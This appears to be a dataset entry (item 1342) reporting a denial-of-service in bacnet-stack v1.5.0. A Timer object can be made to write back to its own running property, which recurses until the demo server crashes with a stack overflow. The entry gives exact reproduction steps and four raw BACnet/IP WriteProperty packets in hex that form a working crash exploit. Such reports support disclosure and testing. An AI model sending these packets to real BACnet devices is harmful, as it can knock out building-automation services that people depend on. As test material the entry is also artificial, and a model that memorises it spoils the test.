@@ -1,0 +1,13 @@
+Number: 1342
+
+Summarize:
+A reported remotely reachable denial-of-service in bacnet-stack v1.5.0 affects the default demo server built from unmodified `apps/server/main.c`. In the Timer object implementation, legitimate WriteProperty requests can set `PROP_STATE_CHANGE_VALUES` and `PROP_LIST_OF_OBJECT_PROPERTY_REFERENCES` so the Timer's internal state-change writeback targets the same Timer object's own `PROP_TIMER_RUNNING`; a later write of `PROP_TIMER_RUNNING = TRUE` causes the internal writeback to re-enter the generic device/property write path and the Timer write handler recursively. The report attributes this to missing self-reference rejection, cycle detection, and writeback re-entry guarding, and the demonstrated impact is process termination with a stack overflow.
+
+Reproduce:
+Use the original bacnet-stack v1.5.0 demo server with `apps/server/main.c` and code under `src/` left unmodified. Run the provided PoC C client against it on loopback; the client binds UDP `127.0.0.1:47809` and sends BACnet WriteProperty packets to `127.0.0.1:47808`, printing any response. Execute the client four times, once with each argument in this order: `scv1` to write `OBJECT_TIMER` instance `1`, `PROP_STATE_CHANGE_VALUES[1] = TRUE`; `scv3` to write `OBJECT_TIMER` `1`, `PROP_STATE_CHANGE_VALUES[3] = TRUE`; `member` to write `OBJECT_TIMER` `1`, `PROP_LIST_OF_OBJECT_PROPERTY_REFERENCES` to a `Device_Object_Property_Reference` for `OBJECT_TIMER:1` / `PROP_TIMER_RUNNING` (with device identifier `OBJECT_DEVICE:123`); and `run` to write `OBJECT_TIMER` `1`, `PROP_TIMER_RUNNING = TRUE`. According to the report, the final `run` request causes recursive self-writeback and the demo server process terminates with a stack overflow.
+
+Payload:
+81 0a 00 17 01 04 00 05 01 0f 0c 07 c0 00 01 1a 01 8c 29 01 3e 11 3f
+81 0a 00 17 01 04 00 05 02 0f 0c 07 c0 00 01 1a 01 8c 29 03 3e 11 3f
+81 0a 00 20 01 04 00 05 03 0f 0c 07 c0 00 01 19 36 3e 0c 07 c0 00 01 1a 01 8d 3c 02 00 00 7b 3f
+81 0a 00 15 01 04 00 05 04 0f 0c 07 c0 00 01 1a 01 8d 3e 11 3f
